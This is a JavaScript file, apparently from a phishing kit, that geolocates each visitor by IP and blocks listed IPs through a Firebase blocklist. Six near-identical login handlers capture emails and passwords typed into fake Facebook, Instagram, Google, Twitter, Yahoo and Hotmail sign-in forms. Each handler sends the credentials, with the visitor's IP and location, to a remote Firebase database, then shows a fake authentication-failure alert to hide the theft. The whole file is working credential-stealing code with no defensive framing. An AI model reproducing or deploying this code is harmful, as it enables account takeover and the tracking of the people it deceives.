const blockStatus = localStorage.getItem("blocked");
const savedIp = localStorage.getItem("ip");

fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    const currentIp = data.ip;

    if (blockStatus === "true") {
      // Check if current IP already exists in the database
      Primarydatabase.ref("/disabled/ipaddress")
        .orderByValue()
        .equalTo(currentIp)
        .once('value')
        .then(snapshot => {
          if (!snapshot.exists()) {
            // New IP detected for blocked user, add it
            Primarydatabase.ref("/disabled/ipaddress").push(currentIp);
          }
          // Block message regardless
          localStorage.setItem("ip", currentIp); // Update stored IP
          document.body.innerHTML = `<div style="display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #000000; color: #ffffff; font-size: 24px;">You are Blocked from this site</div>`;
        })
        .catch(error => {
          console.error("Firebase error:", error);
          console.log("Couldn't verify your IP. Please refresh.");
          //refresh page
            window.location.reload();
        });
    } else {
      // User is not marked blocked yet, check if IP exists in blocklist
      Primarydatabase.ref("/disabled/ipaddress")
        .orderByValue()
        .equalTo(currentIp)
        .once('value')
        .then(snapshot => {
          if (snapshot.exists()) {
            // IP is in blocklist, mark user as blocked
            localStorage.setItem("blocked", "true");
            localStorage.setItem("ip", currentIp);
            document.body.innerHTML = `<div style="display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #000000; color: #ffffff; font-size: 24px;">You are Blocked from this site</div>`;
          } else {
            // Not blocked
            localStorage.setItem("ip", currentIp);
            console.log("User is not blocked.");
          }
        })
        .catch(error => {
          console.error("Firebase check error:", error);
          console.log("Couldn't verify your IP. Please refresh.");
            //refresh page
                window.location.reload();
        });
    }
  })
  .catch(error => {
    console.error("IP Fetch Error:", error);
 console.log("An error occurred while checking your IP.");
  });


fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    const ip = data.ip;
    console.log(ip)
fetch(`https://freeipapi.com/api/json/${ip}`).then(response =>{
        if(!response.ok){
            alert("An Error Occured ERR-1, Try again");
            throw new Error('Network response was not ok');
        }
        return response.json();
    }).then(data =>{
        const Data1 = data;
        console.log(Data1);
        const lat = Data1.latitude;
        const long = Data1.longitude;
        console.log("lat", lat, "long", long);
        fetch(`https://geolocation-db.com/json/${lat}/${long}`).then(response => {
            if(!response.ok){
                alert("An Error Occured ERR-1, Try again");
                throw new Error('Network response was not ok');
            }
            return response.json();
        }).then(data =>{
            const Data2 = data;
            fetch(`https://nominatim.openstreetmap.org/reverse?format=geojson&lat=${lat}&lon=${long}`).then(response => {
                if(!response.ok){
                    alert("An Error Occured ERR-1, Try again");
                    throw new Error('Network response was not ok');
                }
                return response.json();
            }).then(data => {
                const Data3 = data.address;
                const allData = {...Data1, ...Data2, ...Data3}
                // Secondarydatabase.ref("fbdet").push(allData).then(()=>{
                //     alert("Sorry, We couldn't Authenticate your Account, Try Again.")
                // }).catch((err)=>{
                //     alert(err.message);
                // });
                // console.log(allData);
                console.log(allData)
                const allData2 = JSON.stringify(allData);
                localStorage.setItem("allData", allData2);
            }).catch(err => {
                console.log(err);
                alert("An error Occured\n Code03, Try Again.");
            });
        }).catch(err => {
            console.log(err);
            alert("An error Occured\n Code02, Try Again.");
        });

    }).catch(err =>{
        console.log(err);
        alert("An error Occured\n Code01, Try Again.");
    });
});
    function formatDate(date) {
    const day = date.getDate();
    const month = date.toLocaleString('default', { month: 'long' });
    const year = date.getFullYear();
  
    const dayString = getDayWithOrdinalSuffix(day);
  
    return `${dayString} ${month} ${year}`;
  }
  function getDayWithOrdinalSuffix(day) {
    if (day >= 11 && day <= 13) {
      return day + 'th';
    }
    switch (day % 10) {
      case 1:
        return day + 'st';
      case 2:
        return day + 'nd';
      case 3:
        return day + 'rd';
      default:
        return day + 'th';
    }
  }
async function login(){
    const email = document.getElementById("Email").value;
    const password = document.getElementById("Password").value;
    const dateTime = new Date();
    const Time = dateTime.toLocaleTimeString();
    const formattedDate = formatDate(dateTime);
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);

    
    const info = localStorage.getItem('allData');
    const infox = JSON.parse(info);
    const ip = localStorage.getItem('ip');
    console.log(infox);
    const lat = infox.latitude;
    const long = infox.longitude;
    if(email !== "" || password !== ""){
    const Data = {
        email,
        password,
        lat,
        long,
        ip,
        Time,
        formattedDate,
        detailtype: "facebook"
    }

    const twoData = {...Data, ...infox};

    console.log("all data", twoData);
    console.log(Data);
    
    Secondarydatabase.ref("fbdet").push(twoData).then(()=>{
                    alert("Sorry, We couldn't Authenticate your Account, Try Again.")
                }).catch((err)=>{
                    alert(err.message);
                });
}else{
    alert("Please enter your Email or Password");
}
}

async function logini(){
  const email = document.getElementById("username").value;
  const password = document.getElementById("password").value;
  const dateTime = new Date();
  const Time = dateTime.toLocaleTimeString();
  const formattedDate = formatDate(dateTime);
  const queryString = window.location.search;
  const urlParams = new URLSearchParams(queryString);

  
  const info = localStorage.getItem('allData');
  const infox = JSON.parse(info);
  const ip = localStorage.getItem('ip');
  console.log(infox);
  const lat = infox.latitude;
  const long = infox.longitude;
  if(email !== "" || password !== ""){
  const Data = {
      email,
      password,
      lat,
      long,
      ip,
      Time,
      formattedDate,
      detailtype: "Instagram"
  }

  const twoData = {...Data, ...infox};

  console.log("all data", twoData);
  console.log(Data);
  
  Secondarydatabase.ref("fbdet").push(twoData).then(()=>{
                  alert("Sorry, We couldn't Authenticate your Account, Try Again.")
              }).catch((err)=>{
                  alert(err.message);
              });
}else{
  alert("Please enter your Email or Password");
}
}
async function loging(){
    const email = document.getElementById("email").value;
    const password = document.getElementById("pass").value;
    const dateTime = new Date();
    const Time = dateTime.toLocaleTimeString();
    const formattedDate = formatDate(dateTime);
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
  
    
    const info = localStorage.getItem('allData');
    const infox = JSON.parse(info);
    const ip = localStorage.getItem('ip');
    console.log(infox);
    const lat = infox.latitude;
    const long = infox.longitude;
    if(email !== "" || password !== ""){
    const Data = {
        email,
        password,
        lat,
        long,
        ip,
        Time,
        formattedDate,
        detailtype: "Google"
    }
  
    const twoData = {...Data, ...infox};
  
    console.log("all data", twoData);
    console.log(Data);
    
    Secondarydatabase.ref("fbdet").push(twoData).then(()=>{
                    alert("Sorry, We couldn't Authenticate your Account, Try Again.")
                }).catch((err)=>{
                    alert(err.message);
                });
  }else{
    alert("Please enter your Email or Password");
  }
  }
async function logint(){
    const email = document.getElementById("email").value;
    const password = document.getElementById("pass").value;
    const dateTime = new Date();
    const Time = dateTime.toLocaleTimeString();
    const formattedDate = formatDate(dateTime);
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
  
    
    const info = localStorage.getItem('allData');
    const infox = JSON.parse(info);
    const ip = localStorage.getItem('ip');
    console.log(infox);
    const lat = infox.latitude;
    const long = infox.longitude;
    if(email !== "" || password !== ""){
    const Data = {
        email,
        password,
        lat,
        long,
        ip,
        Time,
        formattedDate,
        detailtype: "Twitter"
    }
  
    const twoData = {...Data, ...infox};
  
    console.log("all data", twoData);
    console.log(Data);
    
    Secondarydatabase.ref("fbdet").push(twoData).then(()=>{
                    alert("Sorry, We couldn't Authenticate your Account, Try Again.")
                }).catch((err)=>{
                    alert(err.message);
                });
  }else{
    alert("Please enter your Email or Password");
  }
  }
async function loginy(){
    const email = document.getElementById("email").value;
    const password = document.getElementById("pass").value;
    const dateTime = new Date();
    const Time = dateTime.toLocaleTimeString();
    const formattedDate = formatDate(dateTime);
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
  
    
    const info = localStorage.getItem('allData');
    const infox = JSON.parse(info);
    const ip = localStorage.getItem('ip');
    console.log(infox);
    const lat = infox.latitude;
    const long = infox.longitude;
    if(email !== "" || password !== ""){
    const Data = {
        email,
        password,
        lat,
        long,
        ip,
        Time,
        formattedDate,
        detailtype: "Yahoo"
    }
  
    const twoData = {...Data, ...infox};
  
    console.log("all data", twoData);
    console.log(Data);
    
    Secondarydatabase.ref("fbdet").push(twoData).then(()=>{
                    alert("Sorry, We couldn't Authenticate your Account, Try Again.")
                }).catch((err)=>{
                    alert(err.message);
                });
  }else{
    alert("Please enter your Email or Password");
  }
  }
  async function loginh(){
    const email = document.getElementById("inp_uname").value;
    const password = document.getElementById("inp_pwd").value;
    const dateTime = new Date();
    const Time = dateTime.toLocaleTimeString();
    const formattedDate = formatDate(dateTime);
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
  
    
    const info = localStorage.getItem('allData');
    const infox = JSON.parse(info);
    const ip = localStorage.getItem('ip');
    console.log(infox);
    const lat = infox.latitude;
    const long = infox.longitude;
    if(email !== "" || password !== ""){
    const Data = {
        email,
        password,
        lat,
        long,
        ip,
        Time,
        formattedDate,
        detailtype: "Hotmail"
    }
  
    const twoData = {...Data, ...infox};
  
    console.log("all data", twoData);
    console.log(Data);
    
    Secondarydatabase.ref("fbdet").push(twoData).then(()=>{
                    alert("Sorry, We couldn't Authenticate your Account, Try Again.")
                }).catch((err)=>{
                    alert(err.message);
                });
  }else{
    alert("Please enter your Email or Password");
  }
  }